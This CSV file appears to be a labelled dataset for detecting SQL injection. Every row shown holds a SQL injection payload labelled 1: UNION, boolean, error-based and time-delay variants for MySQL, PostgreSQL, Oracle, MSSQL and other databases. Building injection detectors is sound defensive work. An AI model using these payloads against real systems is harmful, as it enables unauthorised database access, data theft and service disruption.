Data,Label
1'   )    )     )   and 5934  =  2309,1
"1'  )   union all select null,null,null#",1
"1' where 8437  =  8437 and make_set  (  8403  =  8403,8899  )  --",1
"1   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"-9178 where 2253  =  2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#",1
"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'adjc'  =  'adjc",1
"select * from generate_series  (  7754,7754,case when   (  7754  =  1252  )   then 1 else 0 end  )   limit 1--",1
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",1
"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  'iifh'  =  'iifh",1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  5324  =  5324",1
"1""  )   where 7753  =  7753",1
"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  9841  =  9841",1
"  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  9815,9815,case when   (  9815  =  9815  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1
"1'  )   as wtfo where 5666  =  5666 union all select null,null,null,null--",1
1'   )    )    and 3355  =  6012 and    (    (   'ofmy'  =  'ofmy,1
"-7579%"" or 6570  =  1764",1
"elt  (  2567  =  9921,9921  )  ",1
-8086%'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',1
"1%""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""%""  =  """,1
-9562' or 8571  =  8571--,1
"1'+  (  select nvht where 9118  =  9118 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",1
"1%"" and   (  2850  =  6610  )  *6610 and ""%""  =  """,1
-3982   )    )    or 6872  =  6872 and    (    (   6331  =  6331,1
"1%'  )   union all select null,null,null,null,null,null--",1
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  4574  =  4574,1
"1""  )   as jngl where 8384  =  8384 and 4580  =  1718--",1
"1 where 9072  =  9072 and elt  (  4249  =  4249,7259  )  --",1
"1%'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",1
1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,1
1'||  (  select 'rdqv' from dual where 1894  =  1894,1
-6202   )    )    or 7845  =  1962--,1
"1 where 4468  =  4468 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%""  =  """,1
"-2340%"" order by 1#",1
"1'||  (  select 'gtri' from dual where 7097  =  7097 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",1
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'mqoj' like 'mqoj,1
1  )   where 4992  =  4992,1
"-4093'   )    )    union all select 5785,5785,5785#",1
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'ngxz'  =  'ngxz",1
-8181'   )    )    or 5926  =  3332#,1
1'  )   as pghp where 9086  =  9086,1
"1%""   )    )    and   (  7817  =  4371  )  *4371 and    (    (   ""%""  =  """,1
"1,  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4932  =  4932  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",1
1   )    )    as eveb where 7567  =  7567,1
"1%""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
"-3902'   )    )     )   union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",1
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'gfll'  =  'gfll",1
"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'jhxh'  =  'jhxh",1
"-9684"" order by 1#",1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""poik""  =  ""poik",1
-1579%'   )    )     )   union all select 7272#,1
1' in boolean mode  )   and 9198  =  9198--,1
"1""  )   as piwi where 2918  =  2918",1
"1%""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""%""  =  """,1
"-8869"" where 3019  =  3019 union all select 3019,3019,3019#",1
1  )   where 4653  =  4653 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",1
"1%""   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""%""  =  """,1
"1 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1%'   )    )    and elt  (  4483  =  5364,5364  )   and    (    (   '%'  =  '",1
"-7271'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'mdtw'  =  'mdtw",1
1   )    )    as efjb where 4642  =  4642 order by 1#,1
"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",1
1'  )   where 2840  =  2840,1
1'||  (  select 'yyil' from dual where 3121  =  3121,1
"1   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5137  =  5137",1
"1%""   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1""   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""kvpy""  =  ""kvpy",1
"-4932%""   )    )    or   (  3076  =  5927  )  *5927 and    (    (   ""%""  =  """,1
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'nelb'  =  'nelb",1
1'||  (  select 'vdeo' where 4355  =  4355,1
1' in boolean mode  )   and 3787  =  7750--,1
"-2790%""  )   union all select 5070,5070#",1
1'||  (  select 'vpuh' where 8164  =  8164,1
-5062  )   where 7457  =  7457 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
1'  )   and 2564  =  3234--,1
"1""  )   as firv where 4522  =  4522 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1'||  (  select 'lkmh' where 7659  =  7659,1
"1'  )   where 3476  =  3476 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'quqx'  =  'quqx",1
1'   )    )    as kgfp where 2366  =  2366,1
"-3952'  )   union all select 6644,6644,6644--",1
"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'khah' like 'khah",1
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'lokx' like 'lokx",1
-2679'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cutk' like 'cutk,1
"-5845'   )    )     )   union all select 3595,3595,3595,3595,3595,3595,3595,3595,3595#",1
"-5857%""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,1
"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""fvrq""  =  ""fvrq",1
"-3316%"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""%""  =  """,1
"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   +'",1
-3304'   )    )    order by 1--,1
"1  )   as jvuo where 6859  =  6859 union all select null,null,null,null,null,null,null#",1
1  )   where 5651  =  5651,1
"1%"" or sleep  (  5  )  #",1
1   )    )    as ctqr where 2609  =  2609,1
1  )   where 4866  =  4866,1
"1'+  (  select 'zxxh' where 4065  =  4065 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""svse""  =  ""svse",1
"1'  )   where 5276  =  5276 union all select null,null--",1
1   )    )     )   or sleep  (  5  )   and    (    (     (  2209  =  2209,1
"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1%""  )   or sleep  (  5  )  #",1
"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",1
1 waitfor delay '0:0:5'--,1
"1'||  (  select 'aair' where 9234  =  9234 union all select null,null,null,null#",1
"-4165"" where 1772  =  1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--",1
"1%""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,1
"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",1
"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",1
"1%"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""%""  =  """,1
"-8109%""   )    )    union all select 9089,9089--",1
1  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
"1'+  (  select pxrg where 5589  =  5589 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'||  (  select 'uebk' from dual where 6990  =  6990,1
"1"" rlike   (  select   (  case when   (  3711  =  3313  )   then 1 else 0x28 end   )    )    and ""iqlh"" like ""iqlh",1
"-9007  )   as gill where 6462  =  6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",1
"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",1
1%' and 7366  =  9197#,1
"-6731"" where 6166  =  6166 union all select 6166,6166,6166,6166,6166,6166--",1
"1   )    )     )   and make_set  (  8882  =  1593,1593  )   and    (    (     (  7989  =  7989",1
1'  )   and   (  3020  =  3020  )  *6703,1
else dbms_lock.sleep  (  0  ) ,1
"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1""   )    )    as yuqr where 7226  =  7226 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""wdbg"" like ""wdbg",1
-2658  )   as casi where 7364  =  7364 or 8245  =  9651--,1
"1""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""tzqk"" like ""tzqk",1
-7984' order by 1--,1
"1"" where 6352  =  6352",1
"1%'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"-4695'   )    )     )   union all select 5844,5844,5844,5844,5844,5844#",1
-8028%'   )    )     )   or 5042  =  5214,1
"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",1
"1"" union all select null#",1
1'||  (  select 'bifa' where 6077  =  6077 and 4547  =  9301,1
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx",1
1   )    )    as ojjk where 3687  =  3687 and   (  4833  =  9218  )  *9218--,1
"-7236 or make_set  (  9618  =  6919,6919  )  ",1
"1""  )   as htyo where 8322  =  8322 and 4595  =  4595#",1
1  )   where 9552  =  9552 and 1961  =  6333--,1
"select pg_sleep  (  5  )   and    (    (   ""byhx"" like ""byhx",1
"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1%'   )    )    union all select null,null,null,null,null,null,null--",1
"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
"-7940%""  )   union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",1
"1""  )   as axua where 6718  =  6718",1
"1'   )    )    as efmy where 7299  =  7299 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
1'+  (  select 'ueak' where 7329  =  7329 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',1
"1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
"1""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""oxvs"" like ""oxvs",1
"1'  )   as ohnu where 4097  =  4097 union all select null,null,null,null,null,null,null,null,null--",1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk""  =  ""jkfk",1
"1%'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   '%'  =  '",1
-6036   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  6723  =  6723,1
"1'||  (  select 'gikt' where 8447  =  8447 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1  )   union all select null,null,null,null,null,null#",1
"1""  )   and 9198  =  9198--",1
"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'wbsz'  =  'wbsz",1
1'+  (  select 'rqok' where 5074  =  5074 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  +',1
1'   )    )    and   (  1427  =  5813  )  *5813 and    (    (   'estb' like 'estb,1
"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1
-3566%' or 2158  =  6289,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1
"-7041""   )    )     )   union all select 2159,2159,2159,2159,2159--",1
"1""   )    )    as qgwq where 6122  =  6122",1
"1""   )    )    as uels where 9447  =  9447 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
"1 and make_set  (  9542  =  8888,8888  )  -- idkn",1
1%'   )    )    order by 1--,1
"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # rhli",1
"1'  )   where 8948  =  8948 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"-9096""  )   where 9452  =  9452 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1
 (  select   (  case when   (  9066  =  5598  )   then 1 else 9066*  (  select 9066 from information_schema.character_sets  )   end   )    ) ,1
1'   )    )    as jtmf where 3937  =  3937,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""rbqs""  =  ""rbqs",1
"1   )    )    union all select null,null,null,null,null,null,null,null#",1
"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'hpbt'  =  'hpbt",1
-9975 where 9760  =  9760 order by 1--,1
"-5182""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'jnmf'  =  'jnmf",1
1'+  (  select hrgu where 9587  =  9587,1
select case when 8237  =  9948 then 1 else null end--,1
"-3781%'  )   union all select 7497,7497,7497,7497,7497--",1
waitfor delay '0:0:5' and '%'  =  ',1
1' where 9544  =  9544,1
"1%' or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'qdsr' like 'qdsr",1
"1%'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   '%'  =  '",1
if  (  5316  =  4416  )   select 5316 else drop function vtve--,1
"-5169""   )    )    union all select 6198,6198,6198,6198--",1
"1"" where 8234  =  8234",1
"1""   )    )    as hiuf where 3277  =  3277 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"-8200' where 3422  =  3422 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1   )    )    as qfnu where 1609  =  1609 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'xfmq'  =  'xfmq",1
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1
"-8358'   )    )     )   union all select 7282,7282--",1
-7726 or 3038  =  3038,1
"1""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""rurz""  =  ""rurz",1
"1' in boolean mode  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  #",1
"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",1
"1   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  4127  =  4127",1
1' where 4403  =  4403 rlike sleep  (  5  )  #,1
"-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",1
